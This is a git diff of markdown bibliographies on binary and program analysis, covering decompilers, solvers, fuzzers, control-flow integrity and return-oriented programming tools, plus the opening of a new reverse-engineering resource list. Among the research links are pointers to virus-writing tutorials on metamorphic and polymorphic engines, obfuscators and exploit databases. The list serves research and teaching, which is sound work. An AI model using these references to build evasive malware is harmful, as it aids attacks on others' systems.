+* Combining Several Analyses into One OR What is a Good Intermediate Language
+  for the Analysis of Executables?
+
+  * http://www.dagstuhl.de/mat/Files/12/12051/12051.SimonAxel.Slides.pdf
+
+* Jakstab uses an IR described in chapter two
+
+  * http://www.cs.rhul.ac.uk/home/kinder/papers/phdthesis.pdf
+
+* Wire A Formal Intermediate Language for Binary Analysis
+
+  * https://drive.google.com/file/d/0BymO5h8P3PgAakZqY1RQSldzRmM/edit?usp=sharing
+
+* Automated Synthesis of Symbolic Instruction Encodings from I/O Samples -
+  http://research.microsoft.com/en-us/um/people/pg/public_psfiles/pldi2012.pdf
+* Towards A Binary Intermediate Language for Real-Time Embedded System by Jianqi
+  Shi, Qin Li, Longfei Zhu, Xin Ye, Yanhong Huang, Huixing Fang and Fu Song
+
+  * http://research.sei.ecnu.edu.cn/~song/publications/MPiE14.pdf
+
+* RockSalt: Better, Faster, Stronger SFI for the x86
+
+  * http://www.cse.lehigh.edu/~gtan/paper/rocksalt.pdf
+
+## Alias / Value Analysis
+
+* Alias Analysis for Assembly
+  * http://reports-archive.adm.cs.cmu.edu/anon/anon/usr/ftp/2006/CMU-CS-06-180R.pdf
+* Probabilistic Alias Analysis for ARM Executable Code
+  * https://drive.google.com/file/d/0BymO5h8P3PgAc29nUFBleGFtTnc/edit?usp=sharing
+* WYSINWYX: What You See Is Not What You Execute
+  * http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.76.637&rep=rep1&type=pdf
+* Static Analysis of x86 Executables by Johannes Kinder
+  * http://www.cs.rhul.ac.uk/home/kinder/papers/phdthesis.pdf
+* BDDStab: BDD-based Value Analysis of Binaries
+  * http://cs.au.dk/~amoeller/tapas2014/tapas2014_2.pdf
+* Static Analysis of x86 Assembly: Certification and Robustness Analysis
+  * http://dumas.ccsd.cnrs.fr/docs/00/63/64/45/PDF/Laporte.pdf
+
+## Control Flow Recovery
+
+* Alias / Value Analysis
+
+  * https://github.com/REMath/literature_review#alias--value-analysis
 
+* Alternating Control Flow Reconstruction
+
+  * http://dslab.epfl.ch/pubs/alternatingCFR.pdf
+
+* Refinement-based CFG Reconstruction from Unstructured Programs by Sebastien
+  Bardin, Philippe Herrmann, and Franck Vedrine
+
+  * http://www.labri.fr/perso/fleury/download/papers/binary_analysis/long-final-vmcai-11.pdf
+
+* Control flow reconstruction from PowerPC binaries
+
+  * http://www2.in.tum.de/bib/files/mihaila09reconstruction.pdf
+
+* Interprocedural Analysis of Low-Level Code
+
+  * http://mediatum.ub.tum.de/doc/1006212/1006212.pdf
 
 ## Binary Rewriting
-* Control Flow Integrity 
- - https://github.com/REMath/literature_review#control-flow-integrity 
-* Metamorphic Software for Buffer Overflow Mitigation 
- - http://www.cs.sjsu.edu/faculty/stamp/students/cs298report.doc
-* Advanced Metamorphic Techniques in Computer Viruses 
- - http://vxheavens.com/lib/apb01.html
-* Metamorphism in practice or "How I made MetaPHOR and what I've learnt" 
- - http://vxheavens.com/lib/vmd01.html
-* Automated reverse engineering: Mistfall engine 
- - http://vxheavens.com/lib/vzo21.html
-* Writing disassembler 
- - http://vxheavens.com/lib/vmd05.html 
-* Benny's Metamorphic Engine for Win32 
- - http://vxheaven.org/29a/29a-6/29a-6.316
-* "Do polymorphism" tutorial 
- - http://vxheavens.com/lib/vwm01.html
-* Introductory Primer To Polymorphism in Theory and Practice 
- - http://vxheaven.org/lib/static/vdat/tupripol.htm
-* Recompiling the metamorphism 
- - http://vxheavens.com/lib/vhe11.html
-* Theme: Metamorphism 
- - http://vxheaven.org/29a/29a-4/29a-4.216
-* Some ideas about metamorphism 
- - http://vxheavens.com/lib/vzo20.html
-* Meta-Level Languages in Viruses 
- - http://vxheavens.com/lib/vsp44.html
-* Metamorphism (part 1) 
- - http://vxheavens.com/lib/vzo10.html
-* Metamorphism 
- - http://vxheavens.com/lib/vlj00.html
-* The Viral Darwinism of W32.Evol 
- - http://www.openrce.org/articles/full_view/27 ( http://www.openrce.org/articles/files/evol_disasm.html )
-* The Molecular Virology of Lexotan32: Metamorphism Illustrated 
- - http://www.openrce.org/articles/full_view/29
-* The Design Space of Metamorphic Malware 
- - http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.69.486&rep=rep1&type=pdf
-* Diablo 
- - http://diablo.elis.ugent.be/
+
+* Control Flow Integrity
+  * https://github.com/REMath/literature_review#control-flow-integrity
+* Metamorphic Software for Buffer Overflow Mitigation
+  * http://www.cs.sjsu.edu/faculty/stamp/students/cs298report.doc
+* Advanced Metamorphic Techniques in Computer Viruses
+  * http://vxheavens.com/lib/apb01.html
+* Metamorphism in practice or "How I made MetaPHOR and what I've learnt"
+  * http://vxheavens.com/lib/vmd01.html
+* Automated reverse engineering: Mistfall engine
+  * http://vxheavens.com/lib/vzo21.html
+* Writing disassembler
+  * http://vxheavens.com/lib/vmd05.html
+* Benny's Metamorphic Engine for Win32
+  * http://vxheaven.org/29a/29a-6/29a-6.316
+* "Do polymorphism" tutorial
+  * http://vxheavens.com/lib/vwm01.html
+* Introductory Primer To Polymorphism in Theory and Practice
+  * http://vxheaven.org/lib/static/vdat/tupripol.htm
+* Recompiling the metamorphism
+  * http://vxheavens.com/lib/vhe11.html
+* Theme: Metamorphism
+  * http://vxheaven.org/29a/29a-4/29a-4.216
+* Some ideas about metamorphism
+  * http://vxheavens.com/lib/vzo20.html
+* Meta-Level Languages in Viruses
+  * http://vxheavens.com/lib/vsp44.html
+* Metamorphism (part 1)
+  * http://vxheavens.com/lib/vzo10.html
+* Metamorphism
+  * http://vxheavens.com/lib/vlj00.html
+* The Viral Darwinism of W32.Evol
+  * http://www.openrce.org/articles/full_view/27 (
+    http://www.openrce.org/articles/files/evol_disasm.html )
+* The Molecular Virology of Lexotan32: Metamorphism Illustrated
+  * http://www.openrce.org/articles/full_view/29
+* The Design Space of Metamorphic Malware
+  * http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.69.486&rep=rep1&type=pdf
+* Diablo
+  * http://diablo.elis.ugent.be/
 
 ## Abstract Interpretation
-* http://arxiv.org/abs/0810.2179 (code: http://hal.inria.fr/docs/00/33/23/39/ANNEX/absint.v ) 
-* http://dumas.ccsd.cnrs.fr/docs/00/63/64/45/PDF/Laporte.pdf (Coq code in the paper)
-* http://pop-art.inrialpes.fr/interproc/interprocweb.cgi (code: http://pop-art.inrialpes.fr/people/bjeannet/bjeannet-forge/interproc/index.html ) 
-* http://www.cs.indiana.edu/l/www/classes/b621/abiall.pdf 
-* http://web.mit.edu/afs/athena.mit.edu/course/16/16.399/www/ 
-* http://www.hexblog.com/?p=42 
-* https://www.openrce.org/blog/view/1672/Control_Flow_Deobfuscation_via_Abstract_Interpretation ( code: https://www.openrce.org/repositories/users/RolfRolles/BitwiseAI.ml )
+
+* http://arxiv.org/abs/0810.2179 (code:
+  http://hal.inria.fr/docs/00/33/23/39/ANNEX/absint.v )
+* http://dumas.ccsd.cnrs.fr/docs/00/63/64/45/PDF/Laporte.pdf (Coq code in the
+  paper)
+* http://pop-art.inrialpes.fr/interproc/interprocweb.cgi (code:
+  http://pop-art.inrialpes.fr/people/bjeannet/bjeannet-forge/interproc/index.html
+  )
+* http://www.cs.indiana.edu/l/www/classes/b621/abiall.pdf
+* http://web.mit.edu/afs/athena.mit.edu/course/16/16.399/www/
+* http://www.hexblog.com/?p=42
+* https://www.openrce.org/blog/view/1672/Control_Flow_Deobfuscation_via_Abstract_Interpretation
+  ( code: https://www.openrce.org/repositories/users/RolfRolles/BitwiseAI.ml )
 * http://www.irisa.fr/celtique/teaching/PAS/
 
 ## Logical solvers
-* http://z3.codeplex.com/ 
+
+* http://z3.codeplex.com/
 * http://alt-ergo.ocamlpro.com/
 * http://yices.csl.sri.com/
 * http://cvc4.cs.nyu.edu/web/
@@ -163,60 +246,72 @@
 * http://mathsat.fbk.eu/
 
 ## Probabilistic Logic
+
 * http://alchemy.cs.washington.edu/
 * https://github.com/opcode81/ProbCog/wiki
 * http://hazy.cs.wisc.edu/hazy/tuffy/
 * https://code.google.com/p/thebeast/
 
 ## Datalog
-* Alias Analysis for Assembly - http://users.ece.cmu.edu/~dbrumley/pdf/Brumley,%20Newsome_2006_Alias%20Analysis%20for%20Assembly%20%28Revised%29.pdf
-* Dyna: Extending Datalog For Modern AI 
- - http://cs.jhu.edu/~jason/papers/eisner+filardo.datalog11-long.pdf and http://www.cs.jhu.edu/~nwf/datalog20-paper.pdf 
-* Using Datalog for fast and easy program analysis 
- - http://cgi.di.uoa.gr/~smaragd/doop-datalog2.0.pdf
-* Implementing Dataflow Analyses for Pegasus in Datalog 
- - http://www.cs.cmu.edu/~drl/course/compilers/report.pdf
-* Using Datalog and binary decision diagrams for program analysis - http://people.csail.mit.edu/mcarbin/papers/aplas05.pdf
-* Datalog for decompilation - https://media.blackhat.com/us-13/US-13-Cesare-Bugalyze.com-Detecting-Bugs-Using-Decompilation-Slides.pdf
-* On Abstraction Re?nement for Program Analyses in Datalog - http://www.cs.ox.ac.uk/people/hongseok.yang/paper/pldi14c-submitted.pdf
-* Scaling Datalog for Machine Learning on Big Data 
- - http://arxiv.org/pdf/1203.0160.pdf
-* Relational Representation of the LLVM Intermediate Language 
- - http://cgi.di.uoa.gr/~smaragd/theses/psallida.pdf
+
+* [Alias Analysis for Assembly](http://users.ece.cmu.edu/~dbrumley/pdf/Brumley,%20Newsome_2006_Alias%20Analysis%20for%20Assembly%20%28Revised%29.pdf)
+* Dyna: Extending Datalog For Modern AI
+  * http://cs.jhu.edu/~jason/papers/eisner+filardo.datalog11-long.pdf and
+    http://www.cs.jhu.edu/~nwf/datalog20-paper.pdf
+* Using Datalog for fast and easy program analysis
+  * http://cgi.di.uoa.gr/~smaragd/doop-datalog2.0.pdf
+* Implementing Dataflow Analyses for Pegasus in Datalog
+  * http://www.cs.cmu.edu/~drl/course/compilers/report.pdf
+* Using Datalog and binary decision diagrams for program analysis -
+  http://people.csail.mit.edu/mcarbin/papers/aplas05.pdf
+* [Datalog for decompilation](https://media.blackhat.com/us-13/US-13-Cesare-Bugalyze.com-Detecting-Bugs-Using-Decompilation-Slides.pdf)
+* On Abstraction Refinement for Program Analyses in Datalog -
+  http://www.cs.ox.ac.uk/people/hongseok.yang/paper/pldi14c-submitted.pdf
+* Scaling Datalog for Machine Learning on Big Data
+  * http://arxiv.org/pdf/1203.0160.pdf
+* Relational Representation of the LLVM Intermediate Language
+  * http://cgi.di.uoa.gr/~smaragd/theses/psallida.pdf
 * http://docs.datomic.com/query.html
-* Using Datalog for Fast and Easy Program Analysis 
- - http://cgi.di.uoa.gr/~smaragd/doop-datalog2.0.pdf
-* An Efficient Engine for Fixed Points with Constraints 
- - http://research.microsoft.com/en-us/um/people/leonardo/muze.pdf
-* On Abstraction Refinement for Program Analyses in Datalog 
- - http://www.cs.ox.ac.uk/people/hongseok.yang/paper/pldi14c-submitted.pdf
-* Efficient Top-Down Computation Of Queries Under The Well-Founded Semantics - http://citeseerx.ist.psu.edu/viewdoc/download;jsessionid=9C9550377F2C74A427FBA59818479087?doi=10.1.1.54.8690&rep=rep1&type=pdf
-* Dedalus: Datalog in Time and Space 
- - http://www.eecs.berkeley.edu/Pubs/TechRpts/2009/EECS-2009-173.pdf
-* Strictly Declarative Specification of Sophisticated Points-to Analyses 
- - http://cgi.di.uoa.gr/~smaragd/doop-oopsla09prelim.pdf 
-* Pregelix: Big(ger) Graph Analytics on A Dataflow Engine 
- - http://arxiv.org/pdf/1407.0455.pdf
+* Using Datalog for Fast and Easy Program Analysis
+  * http://cgi.di.uoa.gr/~smaragd/doop-datalog2.0.pdf
+* An Efficient Engine for Fixed Points with Constraints
+  * http://research.microsoft.com/en-us/um/people/leonardo/muze.pdf
+* On Abstraction Refinement for Program Analyses in Datalog
+  * http://www.cs.ox.ac.uk/people/hongseok.yang/paper/pldi14c-submitted.pdf
+* Efficient Top-Down Computation Of Queries Under The Well-Founded Semantics -
+  http://citeseerx.ist.psu.edu/viewdoc/download;jsessionid=9C9550377F2C74A427FBA59818479087?doi=10.1.1.54.8690&rep=rep1&type=pdf
+* Dedalus: Datalog in Time and Space
+  * http://www.eecs.berkeley.edu/Pubs/TechRpts/2009/EECS-2009-173.pdf
+* Strictly Declarative Specification of Sophisticated Points-to Analyses
+  * http://cgi.di.uoa.gr/~smaragd/doop-oopsla09prelim.pdf
+* Pregelix: Big(ger) Graph Analytics on A Dataflow Engine
+  * http://arxiv.org/pdf/1407.0455.pdf
 
 ## String Solvers
+
 * http://webblaze.cs.berkeley.edu/2010/kaluza/
 * http://people.csail.mit.edu/akiezun/hampi/
 * http://www.cs.purdue.edu/homes/zheng16/str/
-* A DPLL(T) Theory Solver for a Theory of Strings and Regular Expressions 
- - http://www.divms.uiowa.edu/ftp/tinelli/papers/LiaEtAl-CAV-14.pdf and http://cvc4.cs.nyu.edu/papers/CAV2014-strings/ 
+* A DPLL(T) Theory Solver for a Theory of Strings and Regular Expressions
+  * http://www.divms.uiowa.edu/ftp/tinelli/papers/LiaEtAl-CAV-14.pdf and
+    http://cvc4.cs.nyu.edu/papers/CAV2014-strings/
+
+## Datasets
 
-## Datasets 
 * https://svn.sosy-lab.org/software/sv-benchmarks/tags/svcomp13/
-* http://samate.nist.gov/SRD/testsuite.php 
+* http://samate.nist.gov/SRD/testsuite.php
 * http://www.nec-labs.com/research/system/systems_SAV-website/benchmarks.php
 * http://www.debian.org/distrib/packages
 * https://github.com/offensive-security/exploit-database
-* 1.2k bugs discovered by Mayhem - https://bugs.debian.org/cgi-bin/pkgreport.cgi?submitter=alexandre%40cmu.edu
+* 1.2k bugs discovered by Mayhem -
+  https://bugs.debian.org/cgi-bin/pkgreport.cgi?submitter=alexandre%40cmu.edu
+
+## Ground Truth
 
-## Ground Truth 
 * http://dwarfstd.org/
 
-## Obfuscators 
+## Obfuscators
+
 * http://vxheaven.org/vx.php?id=eidx
 * http://cansecwest.com/core03/shiva.ppt
 * http://diablo.elis.ugent.be/obf_deobfuscation_byhand
@@ -225,23 +320,31 @@
 * https://github.com/0vercl0k/stuffz/blob/master/llvm-funz/kryptonite/llvm-functionpass-kryptonite-obfuscater.cpp
 * http://code.google.com/p/pescrambler/
 * http://www.phrack.org/issues.html?id=13&issue=63
-* https://github.com/obfuscator-llvm/obfuscator/wiki (https://github.com/obfuscator-llvm/obfuscator/tree/clang-425.0.24)
-* Binary code obfuscation through C++ template metaprogramming - https://www.cisuc.uc.pt/publication/showfile?fn=1357250736_metaobfv3.pdf
+* https://github.com/obfuscator-llvm/obfuscator/wiki
+  (https://github.com/obfuscator-llvm/obfuscator/tree/clang-425.0.24)
+* Binary code obfuscation through C++ template metaprogramming -
+  https://www.cisuc.uc.pt/publication/showfile?fn=1357250736_metaobfv3.pdf
 
 ## Hidden Computation
+
 * http://mainisusuallyafunction.blogspot.com.es/2014/02/x86-is-turing-complete-with-no-registers.html
 * https://github.com/jbangert/trapcc
 * http://www.cl.cam.ac.uk/~sd601/papers/mov.pdf
-* C++ Templates are Turing Complete - http://ubietylab.net/ubigraph/content/Papers/pdf/CppTuring.pdf
+* C++ Templates are Turing Complete -
+  http://ubietylab.net/ubigraph/content/Papers/pdf/CppTuring.pdf
 * https://github.com/elitheeli/stupid-machines
 
 ## Deobfuscation
-* Using optimization algorithms for malware deobfuscation - http://os2.zemris.fer.hr/ns/malware/2010_spasojevic/diplomski_spasojevic.pdf
-* Unpacking Virtualization Obfuscators - http://static.usenix.org/event/woot09/tech/full_papers/rolles.pdf
+
+* Using optimization algorithms for malware deobfuscation -
+  http://os2.zemris.fer.hr/ns/malware/2010_spasojevic/diplomski_spasojevic.pdf
+* Unpacking Virtualization Obfuscators -
+  http://static.usenix.org/event/woot09/tech/full_papers/rolles.pdf
 * https://code.google.com/p/optimice/
 
 ## Disassemblers
-* http://code.google.com/p/gdsl-toolkit/wiki/Overview 
+
+* http://code.google.com/p/gdsl-toolkit/wiki/Overview
 * http://www.beaengine.org/
 * http://code.google.com/p/distorm/
 * https://hex-rays.com/products/ida/index.shtml
@@ -252,21 +355,24 @@
 * winSRDF https://github.com/AmrThabet/winSRDF
 * Udis86 http://udis86.sourceforge.net/
 
-## Decompilers 
+## Decompilers
+
 * http://users.ece.cmu.edu/~ejschwar/papers/usenix13.pdf
 * http://dagger.repzret.org/
 * http://www.cl.cam.ac.uk/~mom22/thesis.pdf
 * http://code.google.com/p/arm-thumb-decompiler-plugin/
 * https://github.com/EiNSTeiN-/ida-decompiler
-* http://boomerang.sourceforge.net/ 
+* http://boomerang.sourceforge.net/
 * http://decompiler.fit.vutbr.cz/decompilation/
 * Retargetable Decompiler http://decompiler.fit.vutbr.cz/index.php
 * C4Decompiler http://www.c4decompiler.com
 * SmartDec decompiler http://decompilation.info/
 * REC Studio 4 http://www.backerstreet.com/rec/rec.htm
-* List of .Net Decompilers: https://code.google.com/p/facile-api/wiki/ListOfDotNetDecompilers
+* List of .Net Decompilers:
+  https://code.google.com/p/facile-api/wiki/ListOfDotNetDecompilers
 
 ## Virtual Machines
+
 * http://klee.llvm.org/
 * https://s2e.epfl.ch/
 * https://github.com/feliam/pysymemu
@@ -274,12 +380,13 @@
 * http://www.megalith.co.uk/8086tiny/
 
 ## Videos
+
 * http://media.ccc.de/browse/congress/2013/30C3_-_5224_-_en_-_saal_6_-_201312271400_-_triggering_deep_vulnerabilities_using_symbolic_execution_-_gannimo.html
 * http://www.youtube.com/watch?v=CJccn9d2t5w
 * http://www.youtube.com/watch?v=YUikShiPEg8
 * http://www.youtube.com/watch?v=b8SeZTgwXEY
 * http://www.youtube.com/watch?v=_jq3swTyk_k
-* http://www.youtube.com/watch?v=1lh_DNBZBHQ 
+* http://www.youtube.com/watch?v=1lh_DNBZBHQ
 * http://www.youtube.com/watch?v=azTVEwxN8zM
 * http://www.youtube.com/watch?v=k1qqNE1xMII
 * https://archive.org/details/Recon2012Keynote-TheCaseForSemantics-basedMethodsInReverseEngineering
@@ -287,8 +394,9 @@
 * https://air.mozilla.org/verification-history/
 * http://vimeo.com/75326415
 
-## Model Checkers 
-* http://nusmv.fbk.eu/ 
+## Model Checkers
+
+* http://nusmv.fbk.eu/
 * http://www.cprover.org/cbmc/
 * http://mtc.epfl.ch/software-tools/blast/index-epfl.php
 * http://research.microsoft.com/en-us/projects/slam/
@@ -296,6 +404,7 @@
 * http://www.cprover.org/boom/
 
 ## Reasoning About Finite-state and Pushdown Automata
+
 * http://research.cs.wisc.edu/wpis/papers/CAV05-tool-demo.pdf
 * http://www.cs.binghamton.edu/~dima/hpca13.pdf
 * http://www2.informatik.uni-stuttgart.de/fmi/szs/tools/moped/
@@ -305,11 +414,13 @@
 * http://www.cs.bham.ac.uk/~hxt/research/rxxr.shtml
 
 ## Debuggers
-* https://bitbucket.org/khooyp/expositor 
+
+* https://bitbucket.org/khooyp/expositor
 * http://www.eresi-project.org/
 * http://redmine.corelan.be/projects/mona
 
 ## Interactive Theorem Provers
+
 * http://research.microsoft.com/en-us/um/people/akenn/coq/LOLA2012.pdf
 * http://research.microsoft.com/en-us/um/people/nick/coqasm.pdf
 * http://research.microsoft.com/en-us/um/people/akenn/coq/HLSL.pdf
@@ -327,18 +438,24 @@
 * http://www.cs.ru.nl/~janz/yarrow/
 
 ## Control Flow Integrity
-* A Retargettable CFI implementation in LLVM. Authors: Joseph Battaglia and Oulin Yao
- - https://github.com/dbrumley/recfi
-* BinCFI: Control Flow Integrity for COTS Binaries 
- - http://www.seclab.cs.sunysb.edu/seclab/bincfi/
+
+* A Retargettable CFI implementation in LLVM. Authors: Joseph Battaglia and
+  Oulin Yao
+  * https://github.com/dbrumley/recfi
+* BinCFI: Control Flow Integrity for COTS Binaries
+  * http://www.seclab.cs.sunysb.edu/seclab/bincfi/
 * https://www.usenix.org/conference/usenixsecurity13/technical-sessions/presentation/Zhang
 * http://lenx.100871.net/papers/FPGate-bluehat.pdf
 * http://lists.cs.uiuc.edu/pipermail/llvmdev/2014-February/070210.html
-* Enforcing Forward-Edge Control-Flow Integrity in GCC & LLVM by Caroline Tice, Tom Roeder, Peter Collingbourne, Stephen Checkoway, ?lfar Erlingsson, Luis Lozano, and Geoff Pike - https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-tice.pdf
-* Control-Flow Integrity Principles, Implementations, and Applications - http://research.microsoft.com/pubs/69217/ccs05-cfi.pdf
+* Enforcing Forward-Edge Control-Flow Integrity in GCC & LLVM by Caroline Tice,
+  Tom Roeder, Peter Collingbourne, Stephen Checkoway, lfar Erlingsson, Luis
+  Lozano, and Geoff Pike -
+  https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-tice.pdf
+* Control-Flow Integrity Principles, Implementations, and Applications -
+  http://research.microsoft.com/pubs/69217/ccs05-cfi.pdf
 
+## C Code / C++ Code (Need to split these at some point)
 
-## C Code / C++ Code (Need to split these at some point) 
 * http://why3.lri.fr/
 * http://pp.ipd.kit.edu/firm/
 * https://code.google.com/p/tanalysis/
@@ -348,7 +465,7 @@
 * http://sourceforge.net/projects/cil/
 * https://github.com/kframework/c-semantics
 * http://sixgill.org
-* https://bitbucket.org/khooyp/otter 
+* https://bitbucket.org/khooyp/otter
 * http://boogie.codeplex.com/
 * https://github.com/jirislaby/stanse
 * https://github.com/dsw/oink-stack/
@@ -358,29 +475,37 @@
 * http://embed.cs.utah.edu/creduce/
 
 ## Quantitative Analysis
-* Daikon detects likely program invariants - http://plse.cs.washington.edu/daikon/
-* DIG: A Dynamic Invariant Generator for Polynomial and Array Invariants - https://bitbucket.org/nguyenthanhvuh/dig/src
+
+* Daikon detects likely program invariants -
+  http://plse.cs.washington.edu/daikon/
+* DIG: A Dynamic Invariant Generator for Polynomial and Array Invariants -
+  https://bitbucket.org/nguyenthanhvuh/dig/src
 * http://www.prismmodelchecker.org/
 * http://software.imdea.org/projects/cacheaudit/
 * http://www-verimag.imag.fr/~tripakis/openkronos.html
 * http://turnersr.github.io/measurements/properties.html
 
 ## Assisted Exploit Engineering
+
 ### Return-oriented Programming
+
 * http://users.ece.cmu.edu/~ejschwar/papers/usenix11.pdf
 * https://github.com/programa-stic/ropc-llvm
 * https://github.com/pakt/ropc
 * https://github.com/JonathanSalwan/ROPgadget
 * https://github.com/0vercl0k/rp
 * https://github.com/trailofbits/bisc
-* Blind Return Oriented Programming (BROP) - http://www.scs.stanford.edu/~sorbo/brop/
+* Blind Return Oriented Programming (BROP) -
+  http://www.scs.stanford.edu/~sorbo/brop/
+
+## Random Testing (Fuzzing)
 
-## Random Testing (Fuzzing) 
 * http://embed.cs.utah.edu/csmith/
 * https://code.google.com/p/american-fuzzy-lop/
 * https://bitbucket.org/blackaura/browserfuzz
 
 ## Dynamic Analysis is an interpretation of the static semantics
+
 * https://github.com/mrmee/heaper
 * https://github.com/neuroo/runtime-tracer
 * https://github.com/CTSRD-SOAAP/taintgrind
@@ -388,7 +513,8 @@
 * https://github.com/neuroo/runtime-tracer
 * https://github.com/wirepair/IDAPinLogger
 
-### To be categorized 
+### To be categorized
+
 * https://github.com/pdasilva/vtrace_scripts
 * https://github.com/rapid7/metasploit-framework/tree/master/external/source/byakugan
 * https://code.google.com/p/narly/
@@ -405,13 +531,16 @@
 * http://mlsec.org/
 
 ## Disassemblers & Debuggers
+
 ## x86 only
+
 * Ollydbg http://www.ollydbg.de/
 * Immunity Debugger https://www.immunityinc.com/products-immdbg.shtml
 * Syser http://www.sysersoft.com/
 * GDB for Windows http://www.equation.com/servlet/equation.cmd?fa=gdb
 
 ## x64
+
 * FDBG http://fdbg.x86asm.net/
 * Nanomite https://github.com/zer0fl4g/Nanomite
 * x64_dbg https://bitbucket.org/mrexodia/x64_dbg
@@ -419,10 +548,13 @@
 * VirtDbg https://code.google.com/p/virtdbg/
 * BugDbg http://pespin.w.interia.pl/
 * MDebug http://www.mdebug.org/
-* Visual DuxDebugger http://www.duxcore.com/index.php/prod/visual-duxdebugger/overview
-* PEBrowseDbg64 Interactive http://www.smidgeonsoft.prohosting.com/pebrowse-pro-interactive-debugger.
+* Visual DuxDebugger
+  http://www.duxcore.com/index.php/prod/visual-duxdebugger/overview
+* PEBrowseDbg64 Interactive
+  http://www.smidgeonsoft.prohosting.com/pebrowse-pro-interactive-debugger.
 
 ## Multi-Architecture
+
 * IDA Pro https://www.hex-rays.com/products/ida/
 * Hopper http://www.hopperapp.com/
 * radare http://radare.org
@@ -431,8 +563,8 @@
 * Frida https://github.com/frida
 * Online Disassembler (ODA) http://www.onlinedisassembler.com/odaweb/
 
-
 ## Java
+
 * Procyon https://bitbucket.org/mstrobel/procyon
 * SecureTeam Java Decompiler http://www.secureteam.net/Java-Decompiler.aspx
 * Luyten https://github.com/deathmarine/Luyten
@@ -441,33 +573,39 @@
 * reJ http://rejava.sourceforge.net/
 * JSwat https://code.google.com/p/jswat/
 * Dr. Garbage Tools http://www.drgarbage.com/index.html
-* JD-GUI http://jd.benow.ca/ 
+* JD-GUI http://jd.benow.ca/
 * JAD http://en.wikipedia.org/wiki/JAD_(JAva_Decompiler)
 * dirtyJOE http://dirty-joe.com/
 
-
 ## Type and Data Structure Recovering
-* Struct Builder: Tool commonly used in game hacking to reverse data structures. This tool is closed source. - http://www.mpcforum.com/showthread.php?128430-Release-StructBuild
 
+* Struct Builder: Tool commonly used in game hacking to reverse data structures.
+  This tool is closed source. -
+  http://www.mpcforum.com/showthread.php?128430-Release-StructBuild
 
 ## Miscellaneous Tools
+
 ## Binary Manipulation Frameworks
 
 ## Deobfuscation/Unpacking
-* PROTECTiON iD: Detects most common application protectors. This tool is closed source. - http://pid.gamecopyworld.com/
 
+* PROTECTiON iD: Detects most common application protectors. This tool is closed
+  source. - http://pid.gamecopyworld.com/
 
 ## Cryptography
 
 ## Visualization
+
 * http://www2.in.tum.de/votum
 * http://worrydream.com/MediaForThinkingTheUnthinkable/
 * Cantor Dust - http://www.youtube.com/watch?v=4bM3Gut1hIk
-* GraphDice: A System for Exploring Multivariate Social Networks - http://www.aviz.fr/graphdice/
+* GraphDice: A System for Exploring Multivariate Social Networks -
+  http://www.aviz.fr/graphdice/
 * Gephi: Open Source Graph Visualization Platform - https://gephi.org/
 
 ## Anti-Debugging / Anti-Reversing
 
 # Acknowledgements
+
 * https://events.ccc.de/congress/2013/wiki/Session:Binary_Analysis
-* http://www.reddit.com/r/ReverseEngineering/comments/1pvqv5/program_analysis_technology_additions_and/cd6tmor
\ No newline at end of file
+* http://www.reddit.com/r/ReverseEngineering/comments/1pvqv5/program_analysis_technology_additions_and/cd6tmor
diff --git a/source/Reverse-Engineering.md b/source/Reverse-Engineering.md
new file mode 100644
index 0000000..1938c4e
--- /dev/null
+++ b/source/Reverse-Engineering.md
@@ -0,0 +1,979 @@
+# Reverse Engineering
+
+### ToC
+
+* [Frameworks](#frameworks)
+* [Debuggers & Related Techniques](#dbg)
+* [Decompilers](#decom)
+* [Comparison Tools](#ct)
+* [Tools](#tools)
+  * [Linux Specific Tools](#lt)
+  * [Windows Specific Tools](#wt)
+  * [Programming Libraries](#pl)
+* [Anti-Reverse Engineering & Countermeasure](#ar)
+* [Guides & Tutorials](#guides)
+* [Hardware Reverse Engineering](#hre)
+* [Protocol Analysis](#pa)
+* [Write-ups](#writeups)
+* [Talks & Videos](#talks)
+* [Papers](#papers)
+* [Wikis & Useful Sites](#wikis)
+
+### To-do
+
+* A proper ToC
+* [Bytecode Club - RE Forum](https://the.bytecode.club/)
+* [Blackbone](https://github.com/DarthTon/Blackbone)
+
+  * Windows memory hacking library
+
+* [Cryptoshark](https://github.com/frida/cryptoshark)
+
+  * Interactive code tracer for reverse-engineering proprietary software
+
+### General
+
+* Articles
+
+  * [Reverse Engineering - Wikipedia](https://en.wikipedia.org/wiki/Reverse_engineering)
+  * [High Level view of what Reverse Engineering is](http://www.program-transformation.org/Transform/DecompilationAndReverseEngineering)
+  * [What is Reverse Engineering?](http://www.program-transformation.org/Transform/DecompilationAndReverseEngineering)
+
+* Educational
+
+  * [Introduction to Reverse Engineering Software - Dartmouth](http://althing.cs.dartmouth.edu/local/www.acm.uiuc.edu/sigmil/RevEng/)
+  * [CSCI 4974 / 6974 Hardware Reverse Engineering](http://security.cs.rpi.edu/courses/hwre-spring2014/)
+  * [Starting from Scratch?](http://www.reddit.com/r/ReverseEngineering/comments/smf4u/reverser_wanting_to_develop_mathematically/)
+  * [Introduction to Reverse Engineering Software](http://althing.cs.dartmouth.edu/local/www.acm.uiuc.edu/sigmil/RevEng/)
+
+    * This book is an attempt to provide an introduction to reverse engineering
+      software under both Linux and Microsoft Windows©. Since reverse
+      engineering is under legal fire, the authors figure the best response is
+      to make the knowledge widespread. The idea is that since discussing
+      specific reverse engineering feats is now illegal in many cases, we should
+      then discuss general approaches, so that it is within every motivated
+      user's ability to obtain information locked inside the black box.
+      Furthermore, interoperability issues with closed-source proprietary
+      systems are just plain annoying, and something needs to be done to educate
+      more open source developers as to how to implement this functionality in
+      their software.
+
+  * [Reverse History Part Two – Research](http://jakob.engbloms.se/archives/1554)
+  * [mammon_'s tales to his grandson](https://mammon.github.io/tales/)
+  * [Reversing Prince Harming’s Kiss of Death](https://reverse.put.as/2015/07/01/reversing-prince-harmings-kiss-of-death/)
+  * [Theorem prover, symbolic execution and practical reverse-engineering](https://doar-e.github.io/presentations/securityday2015/SecDay-Lille-2015-Axel-0vercl0k-Souchet.html#/)
+
+* Timelines
+
+  * [Symbolic execution timeline](https://github.com/enzet/symbolic-execution)
+    * Diagram highlights some major tools and ideas of pure symbolic execution,
+      dynamic symbolic execution (concolic) as well as related ideas of model
+      checking, SAT/SMT solving, black-box fuzzing, taint data tracking, and
+      other dynamic analysis techniques.
+
+* Videos
+
